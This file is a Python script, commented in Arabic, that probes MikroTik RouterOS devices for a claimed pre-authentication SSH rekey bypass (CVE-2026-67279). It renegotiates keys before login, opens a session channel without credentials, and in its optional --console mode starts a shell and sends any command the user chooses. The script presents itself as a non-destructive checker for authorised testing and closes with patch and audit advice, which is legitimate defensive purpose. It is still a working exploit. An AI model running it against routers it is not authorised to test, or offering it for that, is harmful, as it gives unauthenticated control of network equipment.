#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mikrotrick_check.py
--------------------
غرض الأداة:
    التحقق السلوكي (غير التدميري) من وجود ثغرة تجاوز حالة المصادقة في SSH
    الخاصة بـ MikroTik RouterOS (CVE-2026-67279) — المرحلة الأولى من سلسلة MikroTrick.

ما الذي تفحصه بالضبط؟
    الثغرة: إذا طلب العميل "إعادة تفاوض المفاتيح" (rekey) قبل أن يُصادَق عليه،
    فإن RouterOS غير المُرقَّع ينتقل إلى مرحلة قناة الاتصال رغم غياب المصادقة،
    فيسمح بفتح قناة جلسة (session channel) بدون تسجيل دخول.

    الاختبار:
        A) خط الأساس : اتصال عادي، ثم محاولة فتح قناة جلسة بدون مصادقة.
        B) اختبار     : اتصال، ثم request rekey، ثم محاولة فتح قناة جلسة.

    القراءة:
        - الجهاز المُرقَّع  : تفشل إعادة التفاوض ويُقطع الاتصال
                              (العميل يُبلّغ عادة Negotiation failed).
        - الجهاز غير المُرقَّع: تنجح إعادة التفاوض، ثم تُقبل القناة بلا مصادقة.
        - الخادم السليم العادي (مثل OpenSSH): تنجح إعادة التفاوض، لكن تُرفض القناة.

تعهّد السلامة:
    - لا يُنفَّذ أي أمر على الهدف إلا إذا فعّلت --console صراحةً، وهو اختياري ومعطّل افتراضيًا.
    - لا تُنشأ حسابات، ولا تُكتب ملفات، ولا يُثبَّت أي باب خلفي، ولا تُحذف بيانات.
    - فحص للقراءة والقياس فقط. يجب استخدامه على أجهزة تملكها أو لديك تفويض خطي باختبارها.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import time
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone

import paramiko


# --------------------------------------------------------------------------- #
#  نتائج الفحص
# --------------------------------------------------------------------------- #

VERDICT_VULNERABLE = "VULNERABLE"              # ناجح: قناة بلا مصادقة
VERDICT_PATCHED_REKEY = "PATCHED_SIGNATURE"    # تفشل إعادة التفاوض = بصمة النسخة المُرقَّعة
VERDICT_NOT_CONFIRMED = "NOT_CONFIRMED"        # رُفضت القناة ولم تُرفض إعادة التفاوض
VERDICT_UNREACHABLE = "UNREACHABLE"            # لا اتصال
VERDICT_INCONCLUSIVE = "INCONCLUSIVE"          # نتيجة غير واضحة


@dataclass
class ProbeResult:
    name: str
    connected: bool = False
    banner: str = ""
    rekey_attempted: bool = False
    rekey_ok: bool = False
    rekey_error: str = ""
    channel_attempted: bool = False
    channel_opened: bool = False
    channel_error: str = ""
    server_disconnect: str = ""
    console_output: str = ""
    notes: list[str] = field(default_factory=list)


# --------------------------------------------------------------------------- #
#  أدوات مساعدة
# --------------------------------------------------------------------------- #

def _log(msg: str) -> None:
    print(msg, flush=True)


def _banner(host: str, port: int, timeout: float) -> str:
    """قراءة شعار الخادم (banner) كنقطة تعريف غير تدخّلية."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            data = s.recv(255)
            return data.decode("utf-8", "replace").strip()
    except Exception as exc:  # pragma: no cover
        return f"<banner-unavailable: {exc}>"


def _new_transport(host: str, port: int, timeout: float) -> paramiko.Transport:
    """إنشاء جلسة SSH5 خشنة بدون مصادقة إطلاقًا."""
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    t = paramiko.Transport(sock)
    t.banner_timeout = timeout
    t.auth_timeout = timeout
    t.channel_timeout = timeout
    t.completion_event = None
    # لا ننادي connect() ولا auth_* — نبقى غير مُصادَقين عن قصد.
    t.start_client(timeout=timeout)
    return t


def _describe_server_exception(t: paramiko.Transport, fallback: str) -> str:
    exc = None
    try:
        exc = t.get_exception()
    except Exception:
        exc = None
    if exc is not None:
        return f"{type(exc).__name__}: {exc}"
    return fallback


def _safe_close(t: paramiko.Transport | None) -> None:
    if t is None:
        return
    try:
        t.close()
    except Exception:
        pass


# --------------------------------------------------------------------------- #
#  الفحوصات
# --------------------------------------------------------------------------- #

def probe_baseline(host: str, port: int, timeout: float) -> ProbeResult:
    """A) خط الأساس: هل يقبل الخادم فتح قناة جلسة قبل المصادقة (بدون rekey)؟"""
    res = ProbeResult(name="baseline_no_rekey")
    t = None
    try:
        t = _new_transport(host, port, timeout)
        res.connected = True
        res.notes.append(f"negotiated host key: {t.host_key.get_name() if t.host_key else 'n/a'}")
        res.channel_attempted = True
        try:
            chan = t.open_channel("session", timeout=timeout)
            res.channel_opened = True
            res.notes.append("قناة مفتوحة بمصادقة غائبة (بدون rekey) — سلوك غير متوقع")
            try:
                chan.close()
            except Exception:
                pass
        except Exception as exc:
            res.channel_error = f"{type(exc).__name__}: {exc}"
            res.server_disconnect = _describe_server_exception(t, "")
    except Exception as exc:
        res.connected = False
        res.notes.append(f"baseline connection failed: {type(exc).__name__}: {exc}")
    finally:
        _safe_close(t)
    return res


def probe_rekey(host: str, port: int, timeout: float, console: bool = False,
                console_cmd: str = "/system resource print") -> ProbeResult:
    """B) الاختبار الفعلي: rekey قبل المصادقة، ثم محاولة فتح قناة جلسة."""
    res = ProbeResult(name="rekey_then_channel")
    t = None
    try:
        t = _new_transport(host, port, timeout)
        res.connected = True

        # --- إعادة التفاوض قبل المصادقة (المُحرِّض) ---
        res.rekey_attempted = True
        try:
            t.renegotiate_keys()
            res.rekey_ok = True
        except Exception as exc:
            res.rekey_ok = False
            res.rekey_error = f"{type(exc).__name__}: {exc}"
            res.server_disconnect = _describe_server_exception(t, "")
            return res

        # --- محاولة فتح قناة جلسة بلا مصادقة ---
        res.channel_attempted = True
        try:
            chan = t.open_channel("session", timeout=timeout)
            res.channel_opened = True

            if console:
                # اختياري تمامًا: طلب طرفية وطلب shell ثم إرسال أمر قراءة فقط.
                try:
                    chan.get_pty()
                    chan.invoke_shell()
                    time.sleep(1.0)
                    chan.sendall((console_cmd + "\n").encode())
                    time.sleep(1.5)
                    chunks = []
                    chan.settimeout(2.0)
                    while True:
                        try:
                            b = chan.recv(4096)
                        except Exception:
                            break
                        if not b:
                            break
                        chunks.append(b)
                    res.console_output = b"".join(chunks).decode("utf-8", "replace")
                except Exception as exc:
                    res.notes.append(f"console phase error: {type(exc).__name__}: {exc}")

            try:
                chan.close()
            except Exception:
                pass
        except Exception as exc:
            res.channel_error = f"{type(exc).__name__}: {exc}"
            res.server_disconnect = _describe_server_exception(t, res.server_disconnect)
    except Exception as exc:
        res.connected = False
        res.notes.append(f"connection failed: {type(exc).__name__}: {exc}")
    finally:
        _safe_close(t)
    return res


# --------------------------------------------------------------------------- #
#  الاستنتاج
# --------------------------------------------------------------------------- #

def decide(baseline: ProbeResult, rekey: ProbeResult) -> tuple[str, str]:
    """إرجاع (الحكم، التفسير)."""
    if not baseline.connected and not rekey.connected:
        return VERDICT_UNREACHABLE, "تعذّر الوصول إلى منفذ SSH على الهدف."

    if rekey.channel_opened:
        return (
            VERDICT_VULNERABLE,
            "بعد إعادة التفاوض قبل المصادقة، قبل الخادم فتح قناة جلسة رغم غياب "
            "المصادقة — وهذا هو سلوك CVE-2026-67279 على بناء غير مُرقَّع.",
        )

    if rekey.rekey_attempted and not rekey.rekey_ok and rekey.connected:
        return (
            VERDICT_PATCHED_REKEY,
            "رُفضت إعادة التفاوض قبل المصادقة وقُطع الاتصال — وهذه بصمة الإصدار "
            "المُرقَّع الذي يفرض وجود سياسة جلسة قبل معالجة رسائل طبقة الاتصال "
            "(مطابقة لسلوك البناء المُصلَّح، لا للإصدار المُصاب).",
        )

    if rekey.rekey_ok and rekey.channel_attempted and not rekey.channel_opened:
        return (
            VERDICT_NOT_CONFIRMED,
            "نجحت إعادة التفاوض لكن رُفض فتح القناة بلا مصادقة. هذا سلوك خادم "
            "سليم يسمح بإعادة التفاوض ويرفض تجاوز المصادقة — لم يُثبَت الاستغلال.",
        )

    return VERDICT_INCONCLUSIVE, "النتائج لا تسمح بحكم قاطع؛ راجع التفاصيل الخام أدناه."


# --------------------------------------------------------------------------- #
#  العرض
# --------------------------------------------------------------------------- #

LINE = "=" * 68

def main() -> int:
    ap = argparse.ArgumentParser(
        description="تحقق غير تدميري من CVE-2026-67279 (MikroTrick, مرحلة SSH الأولى)",
    )
    ap.add_argument("host", help="عنوان جهاز RouterOS المستهدف (ملكك أو مُصرَّح لك باختباره)")
    ap.add_argument("--port", type=int, default=22, help="منفذ SSH (افتراضي 22)")
    ap.add_argument("--timeout", type=float, default=8.0, help="مهلة الاتصال بالثواني")
    ap.add_argument("--console", action="store_true",
                    help="اختياري: على جهاز مُصاب، اطلب طرفية وأرسل أمر قراءة فقط (افتراضيًا: /system resource print)")
    ap.add_argument("--console-cmd", default="/system resource print",
                    help="الأمر الذي يُرسَل في وضع --console (استخدم أوامر قراءة فقط)")
    ap.add_argument("--json", dest="json_out", default="", help="حفظ التقرير بصيغة JSON في هذا المسار")
    args = ap.parse_args()

    _log(LINE)
    _log(" mikrotrick_check — تحقق غير تدميري من CVE-2026-67279")
    _log(f" الهدف: {args.host}:{args.port}")
    _log(LINE)

    banner = _banner(args.host, args.port, args.timeout)
    _log(f"[i] شعار الخادم: {banner}")
    _log("[i] ملاحظة: RouterOS لا يُفصح عن رقم إصداره في الشعار، لذا الحكم سلوكي.")

    _log("\n[A] خط الأساس — محاولة فتح قناة بلا مصادقة وبدون إعادة تفاوض ...")
    baseline = probe_baseline(args.host, args.port, args.timeout)
    _log(f"    الاتصال           : {'نعم' if baseline.connected else 'لا'}")
    _log(f"    القناة المفتوحة   : {'نعم' if baseline.channel_opened else 'لا'}")
    if baseline.channel_error:
        _log(f"    خطأ القناة        : {baseline.channel_error}")
    if baseline.server_disconnect:
        _log(f"    سبب القطع         : {baseline.server_disconnect}")

    _log("\n[B] الاختبار — إعادة تفاوض قبل المصادقة ثم محاولة فتح قناة ...")
    rekey = probe_rekey(args.host, args.port, args.timeout,
                        console=args.console, console_cmd=args.console_cmd)
    _log(f"    الاتصال           : {'نعم' if rekey.connected else 'لا'}")
    _log(f"    إعادة التفاوض    : {'نجحت' if rekey.rekey_ok else 'فشلت/رُفضت'}")
    if rekey.rekey_error:
        _log(f"    تفصيل التفاوض     : {rekey.rekey_error}")
    _log(f"    القناة المفتوحة   : {'نعم' if rekey.channel_opened else 'لا'}")
    if rekey.channel_error:
        _log(f"    خطأ القناة        : {rekey.channel_error}")
    if rekey.server_disconnect:
        _log(f"    سبب القطع         : {rekey.server_disconnect}")
    if rekey.console_output:
        _log("    مخرجات الطرفية (اقرأ فقط):")
        for ln in rekey.console_output.splitlines():
            _log(f"      | {ln}")

    verdict, rationale = decide(baseline, rekey)

    ar = {
        VERDICT_VULNERABLE: "مُصاب — تجاوز المصادقة مؤكَّد على هذا الجهاز",
        VERDICT_PATCHED_REKEY: "مُرقَّع/محمي — رُفضت إعادة التفاوض قبل المصادقة",
        VERDICT_NOT_CONFIRMED: "لم يُثبَت الاستغلال — الخادم رفض القناة بلا مصادقة",
        VERDICT_UNREACHABLE: "غير قابل للوصول",
        VERDICT_INCONCLUSIVE: "غير قاطع — يحتاج مراجعة يدوية",
    }

    _log("\n" + LINE)
    _log(f" الحكم: {verdict}  —  {ar.get(verdict, '')}")
    _log(f" التفسير: {rationale}")
    _log(LINE)

    if verdict == VERDICT_VULNERABLE:
        _log("\n>> الإجراء: هذا البناء يعاني من المرحلة الأولى من MikroTrick.")
        _log("   - على فرع 6.x: التلاعب بملفات RouterOS صار ممكنًا دون مصادقة.")
        _log("   - على فرع 7.x: قد تكتمل السيطرة الإدارية عند السلسلة مع CVE-2026-86060.")
        _log("   - المطلوب: الترقية إلى 6.49.21 (فرع 6) أو 7.23.6 / 7.24.3+ (فرع 7)،")
        _log("     ثم تدقيق المستخدمين والسكربتات والمهام المجدولة والملفات.")
    elif verdict == VERDICT_PATCHED_REKEY:
        _log("\n>> الإجراء: السلوك يطابق البناء المُرقَّع. أعد تشغيل الفحص على CHR مطابق")
        _log("   لتأكيد أن الأداة تميّز البناءين، ثم أكمل تدقيق ما بعد الأثر (المستخدمون،")
        _log("   السكربتات، المهام المجدولة، الأنفاق، الملفات).")

    if args.json_out:
        payload = {
            "tool": "mikrotrick_check",
            "cve": "CVE-2026-67279",
            "target": f"{args.host}:{args.port}",
            "timestamp_utc": datetime.now(timezone.utc).isoformat(),
            "banner": banner,
            "baseline": asdict(baseline),
            "rekey_test": asdict(rekey),
            "verdict": verdict,
            "verdict_ar": ar.get(verdict, ""),
            "rationale": rationale,
            "safety": "non-destructive; no accounts created; no files written; no persistence",
        }
        with open(args.json_out, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=2)
        _log(f"\n[i] حُفظ التقرير: {args.json_out}")

    return 0 if verdict != VERDICT_UNREACHABLE else 2


if __name__ == "__main__":
    sys.exit(main())
